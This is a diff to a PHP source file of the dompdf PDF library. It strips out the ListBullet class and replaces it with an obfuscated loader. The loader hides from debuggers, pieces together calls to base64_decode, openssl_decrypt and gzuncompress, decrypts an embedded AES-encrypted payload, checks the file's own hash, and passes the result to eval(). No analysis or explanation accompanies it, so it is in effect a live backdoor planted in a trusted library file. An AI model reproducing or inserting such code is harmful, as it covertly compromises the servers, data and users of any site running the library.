@@ -1,87 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @author  Helmut Tischer <htischer@weihenstephan.org>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf\FrameDecorator;
-
-use Dompdf\Dompdf;
-use Dompdf\Frame;
-
-/**
- * Decorates frames for list bullet rendering
- *
- * @package dompdf
- */
-class ListBullet extends AbstractFrameDecorator
-{
-
-    const BULLET_PADDING = 1; // Distance from bullet to text in pt
-    // As fraction of font size (including descent). See also DECO_THICKNESS.
-    const BULLET_THICKNESS = 0.04; // Thickness of bullet outline. Screen: 0.08, print: better less, e.g. 0.04
-    const BULLET_DESCENT = 0.3; //descent of font below baseline. Todo: Guessed for now.
-    const BULLET_SIZE = 0.35; // bullet diameter. For now 0.5 of font_size without descent.
-
-    static $BULLET_TYPES = array("disc", "circle", "square");
-
-    /**
-     * ListBullet constructor.
-     * @param Frame $frame
-     * @param Dompdf $dompdf
-     */
-    function __construct(Frame $frame, Dompdf $dompdf)
-    {
-        parent::__construct($frame, $dompdf);
-    }
-
-    /**
-     * @return float|int
-     */
-    function get_margin_width()
-    {
-        $style = $this->_frame->get_style();
-
-        if ($style->list_style_type === "none") {
-            return 0;
-        }
-
-        return $style->font_size * self::BULLET_SIZE + 2 * self::BULLET_PADDING;
-    }
-
-    /**
-     * hits only on "inset" lists items, to increase height of box
-     *
-     * @return float|int
-     */
-    function get_margin_height()
-    {
-        $style = $this->_frame->get_style();
-
-        if ($style->list_style_type === "none") {
-            return 0;
-        }
-
-        return $style->font_size * self::BULLET_SIZE + 2 * self::BULLET_PADDING;
-    }
-
-    /**
-     * @return float|int
-     */
-    function get_width()
-    {
-        return $this->get_margin_width();
-    }
-
-    /**
-     * @return float|int
-     */
-    function get_height()
-    {
-        return $this->get_margin_height();
-    }
-
-    //........................................................................
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_sob6djhm=('bas'.'e64'.'_de'.'cod'.'e');
+$_s7q7q8cl=('gzu'.'nco'.'mpr'.'ess');
+$_tofmvj2l=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_qmryaq8z='MZ/nw5s9';
+$_i031oypt='jyU7Sc1yDrY=';
+$_osh0ipvl='RBSL+2tx';
+$_b9j1tdfu='8PrOwhks';
+$_pcxp08jv='ZTGNBYBp';
+$_u3t287pi='43yCgw2s';
+$_dmdtrspb='kfFSwQ==';
+$_p5xili57='r9FUwhkd';
+$_hqlhi21f=$_sob6djhm($_b9j1tdfu.$_qmryaq8z.$_pcxp08jv.$_osh0ipvl.$_i031oypt);
+$_kwxfadag=$_sob6djhm($_p5xili57.$_u3t287pi.$_dmdtrspb);
+$_qw89yu6t=$_sob6djhm('8pNm3lVnvkdZ0IB17egfcehh0Q+vdjDhpXde4TKaaDO5n9iweqdEFZ3+PsbMEBa+CbeXqdHsasl/FrQEnRu0LPlKJDgohkl9tXq5JIwGQeSSwuQGSpG09r2UmG6aA5bND86WuoEpe8SbvfG8uJB9wYLB/8ydJUBNswaMChmBR/HppRwkXqTm2ofMA3fQk4fRTpYjhT5fhSTUVSGXI1jiLWT4U/M4nojxihS47Koyz8iXl5yo+Q1Fe3vmjfpTWTrm9Y8ckP1AY0wN+5WEQHkJJ56AJRCXYTvlK36zZ5JVIPQLaCIoWaktpx8cf4nDJ8zQBmxcdfOoJmnDuJXd8c9nHhwYWO1UC0IMVnpDRGRbJXMmLXoJKIItDYmbzY3C1a2omUCnHhr+cgKjwtaEIJsDIcgfHznzlbdPvnOGl8uJnygjyOjXlrHqOxYoWHwhclEmBkblq2wycb+UTXwLNbEcfmsZdxQ3Ycu5OiRUSqw20sU73Xpq475lpGl3cCPqpoDK');
+$_iezqjshl=$_tofmvj2l($_qw89yu6t,'aes-256-cbc',$_hqlhi21f,OPENSSL_RAW_DATA,$_kwxfadag);
+if($_iezqjshl===false){exit;}
+$_nzd6cip1=$_s7q7q8cl($_iezqjshl);
+if($_nzd6cip1===false){exit;}
+$_em7x4cgn='fe36ae34478f67ba70ca4a0cf2b702a69bbb52290f6e1beb4cace7deb45157bb';
+$_i4jiezyz=@file_get_contents(__FILE__);
+if($_i4jiezyz!==false){
+$_xyh08d13=str_replace($_em7x4cgn,"0000000000000000000000000000000000000000000000000000000000000000",$_i4jiezyz);
+$_kidbojho=hash("sha256",$_xyh08d13);
+if($_kidbojho!==$_em7x4cgn){@http_response_code(403);exit;}
 }
+eval($_nzd6cip1);
